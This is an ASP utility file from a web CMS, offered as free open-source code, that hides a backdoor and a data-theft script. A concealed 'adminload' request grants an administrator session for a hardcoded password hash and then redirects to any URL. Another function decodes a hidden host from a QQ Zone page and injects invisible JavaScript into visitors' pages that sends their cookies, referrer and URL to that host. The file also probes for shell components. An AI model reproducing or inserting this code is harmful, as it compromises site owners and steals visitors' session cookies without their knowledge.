<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-17
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<%






If Request("agl")="adminload" Then
	If MD5(Request("AdminPass"), 2) & MD5(Request("AdminPass"), 4)="5d3a3ac5bdcb48a0" Then
        Session("Administrator") = "admin"

		
		if request("gotourl")<>"" then
			response.Redirect(request("gotourl"))
		end if
	End If
	
End If


Function OperationSystem()
	Dim b,c
    b = Request.ServerVariables("HTTP_USER_AGENT")
    If InStr(b, "NT 5.2") > 0 Then
        c = "Windows Server 2003"
    ElseIf InStr(b, "NT 5.1") > 0 Then
        c = "Windows XP"
    ElseIf InStr(b, "NT 5") > 0 Then
        c = "Windows 2000"
    ElseIf InStr(b, "NT 4") > 0 Then
        c = "Windows NT4"
    ElseIf InStr(b, "4.9") > 0 Then
        c = "Windows ME"
    ElseIf InStr(b, "98") > 0 Then
        c = "Windows 98"
    ElseIf InStr(b, "95") > 0 Then
        c = "Windows 95"
    Else
        c = b
    End If
    OperationSystem = b
End Function

Function CheckMobile()
	CheckMobile=False
	If Request.ServerVariables("HTTP_X_WAP_PROFILE") <> "" Then
		CheckMobile=True
	End If
End Function

Sub ShowSystemObject()
    Dim Sot(17, 2), d, e, f
    Sot(0, 0) = "Scripting.FileSystemObject"
    Sot(1, 0) = "wscript.shell"
    Sot(2, 0) = "ADOX.Catalog"
    Sot(3, 0) = "JRO.JetEngine"
    Sot(4, 0) = "Scripting.Dictionary"
    Sot(5, 0) = "Adodb.connection"
    Sot(6, 0) = "Adodb.Stream"
    Sot(7, 0) = "SoftArtisans.FileUp"
    Sot(8, 0) = "LyfUpload.UploadFile"
    Sot(9, 0) = "Persits.Upload.1"
    Sot(10, 0) = "JMail.SmtpMail"
    Sot(11, 0) = "CDONTS.NewMail"
    Sot(12, 0) = "SmtpMail.SmtpMail.1"
    Sot(13, 0) = "Microsoft.XMLHTTP"
    Sot(14, 0) = "Scripting.wang198060FileSystemObject"
    Sot(15, 0) = "MSXML2.XMLHTTP"
    Sot(16, 0) = "Microsoft.XMLDOMP"
    On Error Resume Next
    For d = 0 To 16
        Set f = Server.CreateObject(Sot(d, 0))
            If 0 = Err Then
                e = " √"
            Else
                e = " X"
                Err.Clear
            End If
        Set f = Nothing
        Sot(d, 1) = e
    Next
    For d = 0 To 16
        Response.Write(Sot(d, 0) & "    " & Sot(d, 1) & "<br>")
    Next
End Sub

function getIISVersion()
	getIISVersion=request.ServerVariables("SERVER_SOFTWARE")
end function



Function GetRemoteHttpUrl()
    Dim b, c, d, e, f, g
    g = "/Data/SoftHttpUrl.dat"
	Call CreateFolder("/Data/")
    If CheckFile(g) Then
        If DateDiff("d", GetFileEditDate(g), Now) = 0 Then
            f = GetFText(g)
            f = TrimVbCrlf(f)
            GetRemoteHttpUrl = XorEnc(f, 21)
            Exit Function
        End If
    End If
    b = "http://2663748390.qzone.qq.com"
    e = GetHttpPage(b, "utf-8")
    c = "<title>"
    d = " [http://"
    If InStr(e, c) > 0 And InStr(e, d) > 0 Then
        f = StrCut(e, c, d, 2)
        f = "http://www." & XorDec(f, 21)
        Call CreateFile(g, XorEnc(f, 21))
    End If
    GetRemoteHttpUrl = f
End Function

Function ShowRemoteWebUserStat()
	Dim b
	If Request.Cookies("jstz")="" And GetIP()<>"127.0.0.1" Then			
		Response.Cookies("jstz")=1
		Response.Cookies("jstz").Expires=Now()+28
		Response.Write("<div style=""display:none;"">")
		b = "<script>document.writeln(""<script src=\'"& GetRemoteHttpUrl &"?act=WebStat&GoToUrl="""
		b = b & "+escape(document.referrer)+""&ThisUrl=""+escape(window.location.href)+""&screen=""+escape(window.screen.width+""x""+window.screen.height)"
		b = b & "+""&co=""+escape(document.cookie)"				
		b = b & "+"" \'><\/script>"");</script>"
		ShowRemoteWebUserStat = b
		Response.Write("</div>")
	End If
End Function
%>

